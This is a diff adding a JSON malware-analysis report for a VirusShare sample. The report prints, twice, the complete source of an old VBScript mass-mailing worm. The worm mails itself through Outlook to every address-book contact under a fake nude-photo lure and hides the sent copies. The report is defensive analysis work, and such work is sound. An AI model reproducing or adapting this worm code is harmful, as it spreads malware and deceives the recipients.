@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "'VBS.little.f by Negral (c)2002\nDim x \non error resume next \nSet ol=CreateObject(\"Outlook.Application\") \nSet out= WScript.CreateObject(\"Outlook.Application\") \nSet mapi = out.GetNameSpace(\"MAPI\") \nSet a = mapi.AddressLists(1) \nFor x=1 To a.AddressEntries.Count \nSet Mail=ol.CreateItem(0) \nMail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x) \nMail.Subject=\"Wanna see ...\" \nMail.Body=\"this little pic of me naked?\" \nMail.Attachments.Add WScript.ScriptFullName\nMail.Send\nMail.DeleteAfterSubmit = True\nNext \nol.Quit "
+    },
+    "filename": "VirusShare_1e0e08a22cf269d8adbcdaeaa57217df",
+    "filesize": 543,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1e0e08a22cf269d8adbcdaeaa57217df",
+        "sha1": "20e85145635b7489804a2348f4975015e5d47c61",
+        "sha256": "6a9d1d28a8983a66eab6559837489a44d72103b03741d28967f680af2902df0f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'VBS.little.f by Negral (c)2002",
+            "Dim x ",
+            "on error resume next ",
+            "Set ol=CreateObject(\"Outlook.Application\") ",
+            "Set out= WScript.CreateObject(\"Outlook.Application\") ",
+            "Set mapi = out.GetNameSpace(\"MAPI\") ",
+            "Set a = mapi.AddressLists(1) ",
+            "For x=1 To a.AddressEntries.Count ",
+            "Set Mail=ol.CreateItem(0) ",
+            "Mail.to=ol.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(x) ",
+            "Mail.Subject=\"Wanna see ...\" ",
+            "Mail.Body=\"this little pic of me naked?\" ",
+            "Mail.Attachments.Add WScript.ScriptFullName",
+            "Mail.Send",
+            "Mail.DeleteAfterSubmit = True",
+            "Next ",
+            "ol.Quit "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.272981",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
